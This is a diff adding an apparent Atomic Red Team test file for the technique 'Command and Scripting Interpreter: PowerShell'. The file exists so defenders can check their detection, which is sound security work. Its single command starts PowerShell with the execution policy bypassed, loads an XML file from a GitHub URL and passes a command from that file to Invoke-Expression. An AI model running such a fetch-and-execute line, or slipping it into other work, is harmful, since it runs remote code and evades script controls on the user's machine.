@@ -1,0 +1,7 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Powershell XML requests
+#Language: cmd
+
+#commands
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
+
